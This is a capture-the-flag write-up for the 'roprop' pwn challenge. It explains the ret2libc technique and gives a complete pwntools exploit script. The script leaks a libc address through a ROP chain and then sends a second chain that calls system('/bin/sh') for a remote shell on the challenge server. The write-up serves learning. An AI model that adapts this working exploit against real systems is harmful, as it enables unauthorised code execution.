@@ -1,0 +1,119 @@
+# Pwn Challenge 
+
+## Name: roprop  
+
+### Description: 
+
+`This is from the back Solar Designer times where you require rope to climb and get anything you want.
+`
+#### nc pwn.darkarmy.xyz 5002
+**Author:gr4n173**
+
+
+**Solution:**
+
+Main target of this challenge was to get familiar with `ret2libc` technique so you can exploit using ret2libc technique i.e. you can use `rops` to pwn the challenge. If you want more detail about it you can see in my blog I have written a simple explanation about ret2libc.   
+  
+  You can find it here [Ret2libc](https://gr4n173.github.io/2020/07/11/ret2libc.html).  
+
+**Exploit:**
+
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='amd64')
+exe = './roprop'
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or '34.126.91.169'
+port = int(args.PORT or 6002)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start()
+
+elf = ELF('./roprop')
+lib = ELF('./libc6_2.27-3ubuntu1.2_amd64.so')
+
+#offset = 80
+pop_rdi = 0x0000000000400963 
+#puts_plt = elf.plt['puts']
+#puts_glt = elf.got['puts']
+ret = 0x0000000000400646
+
+#First rop to be send
+payload = 'A'*88
+payload += p64(pop_rdi)
+payload += p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.symbols['main'])
+
+io.sendline(payload)
+
+log.info('Puts plt   : ' + hex(elf.plt['puts']))
+log.info('Puts got   : ' + hex(elf.got['puts']))
+
+#io.recvline()
+io.recvline()
+io.recvline()
+leak= u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+log.info('Puts Leak  : ' + hex(leak))
+
+libc_base = leak - 0x080a30
+system = libc_base +0x04f4e0 
+binsh  = libc_base + 0x1b40fa
+
+log.info('Libc Base  : ' + hex(libc_base))
+log.info('System     : ' + hex(system))
+log.info('Binsh      : ' + hex(binsh))
+
+#Second rop to be send
+payload = 'A'* 88
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+io.sendline(payload)
+io.interactive()
+```
+
+
+
